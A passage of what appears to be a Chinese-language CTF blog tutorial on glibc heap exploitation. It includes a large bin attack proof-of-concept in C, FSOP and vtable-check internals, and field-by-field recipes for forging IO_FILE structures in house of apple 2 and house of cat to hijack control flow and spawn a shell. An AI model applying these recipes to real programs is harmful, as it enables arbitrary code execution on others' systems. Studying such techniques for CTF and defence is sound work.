&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>达到一个任意地址写成堆地址的目的。<br>Glibc 2.29 之前，unsortedbin attack 和 largebin attack 都是攻击 bk 指针，但是后来加了一句检查</p>
<p>在攻击时，fd,bk,fd_nextsize 可以随便覆盖内容，在经过malloc后会修复fd，因为fd指向 size 较小的 victim</p>
<h3 id="IO-流"><a href="#IO-流" class="headerlink" title="IO 流"></a>IO 流</h3><p>这里一般指 存在一条链，某个函数 使用 vtable 的函数指针来调用函数。</p>
<p>程序使用exit退出程序</p>
<ul>
<li>从main函数退出，glibc会调用exit</li>
<li>显示调用 exit 函数退出程序</li>
</ul>
<p>malloc_assert: house of kiwi 提出，触发下面的条件选一个</p>
<ul>
<li>topchunk的大小小于MINSIZE(0X20)  </li>
<li>prev inuse位为0  </li>
<li>old_top页未对齐</li>
<li>但是从libc 2.36 发生了一点变化，移除IO操作，也就是从libc 2.36不能使用</li>
<li>libc 2.37 直接没有这个函数了。</li>
</ul>
<p>libc 2.35：</p>
<ul>
<li>两个函数(fflsh, fxpeintf)都涉及IO操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行_IO_flush_all_lockp函数，这个函数会根据_IO_list_all刷新链表中的所有文件流.</p>
<p>当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，调用链如下</p>
<ul>
<li>最后会遍历<code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	fcloseall</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all_lockp</span><br><span class="line">				_IO_OVERFLOW</span><br></pre></td></tr></table></figure>


<p>vtable 函数调用过程，就是调用跳表，比如说调用 <code>__overflow</code> </p>
<ul>
<li><code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</li>
<li>最后就是调用 vtable 里面的函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure>

<p>检查函数</p>
<ul>
<li>检查此结构体的 vtable 与 <code>__io_vtables</code> 全局变量表偏移</li>
<li>在这个表里的表就能通过检查。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在劫持vtable都差不多在这个表里找一个能符合条件的表进行利用。</p>
<p>比如挟持到 <code>_wide_data</code> 相关的表，因为这个表含有vtable，并且函数调用没有检查。</p>
<ul>
<li>而与其相关的表有3个 找 <code>_IO_wfile_jumps</code> 开头的表存在三个</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote>
<p>有三个版本，这里是 version 2.0，控制函数执行流。</p>
</blockquote>
<ol>
<li>IO 流：exit 或者 malloc_assert</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址 </li>
<li>能使用一次 <code>largebin attack</code>（一次即可）</li>
</ol>
<p>wide_data 结构体</p>
<ul>
<li>其中也存在一个 vtable</li>
<li>由上面的FSOP知道，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但是没有检查，因此更好利用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设劫持了vtable 到 <code>IO_wdata_jumps</code> 之后，调用overflow</p>
<ul>
<li>因为是宏展开，进入 <code>_IO_wfile_jumps</code> 的 overflow 函数。</li>
<li>而这个函数执行流如下</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow(FILE *f, <span class="type">wint_t</span> wch) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> ||</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>) &#123;</span><br><span class="line">      _IO_wdoallocbuf(f);</span><br><span class="line">      _IO_free_wbackup_area(f);</span><br><span class="line">      _IO_wsetg(f, f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">         (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">         logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">         the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">         block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">         Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">         that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">         external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end) &#123;</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">            f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">        f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF) <span class="keyword">return</span> _IO_do_flush(f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) ||</span><br><span class="line">      ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(f) == EOF) <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span>(_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>

<p>主要看其中的函数调用，这里主要看作者的几条连</p>
<p>链1：<code>_IO_wfile_overflow</code> 控制函数执行流，但是需要绕过某些检查。伪造fp</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链2：<code>_IO_wfile_underflow_mmap</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>

<p>链3：<code>_IO_wdefault_xsgetn</code> 控制函数执行流</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>



<p>总结一下：使用 <code>largebin attack</code> 劫持<code>_IO_list_all</code> 变量</p>
<ul>
<li>将其替换为一个伪造的 <code>IO_FILE</code> 结构体（某个我们可控内容的堆）</li>
<li>IO_FILE的 <code>_wide_data</code> 伪造为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>IO_FILE的 <code>vtable</code> 伪造为 <code>_IO_wfile_jumps</code>，这是一个 const 变量, gdb使用<code>p &amp;_IO_wfile_jumps</code>查看</li>
<li>在需要写shellcode时，将C设置为一个写满ROP的堆地址就行。常使用setcontext</li>
</ul>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>函数调用链</p>
<ul>
<li><code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数中来攻击</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__malloc_assert</span><br><span class="line">	​__fxprintf</span><br><span class="line">		​locked_vfxprintf</span><br><span class="line">			__vfprintf_internal #在这里是跳转到IO_validate_vtable通过vtable+<span class="number">0x38</span>调用的下面函数</span><br><span class="line">				​_IO_wfile_seekoff</span><br><span class="line">					_IO_switch_to_wget_mode</span><br><span class="line">						​call qword ptr [rax + <span class="number">0x18</span>] <span class="meta">#rax是伪造的io_file的地址</span></span><br></pre></td></tr></table></figure>


<p>并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<code>_IO_wfile_seekoff</code>即可（通常是结合<code>__malloc_assert</code>，改vtable为<code>_IO_wfile_jumps+0x10</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))   <span class="comment">// xxxx</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span 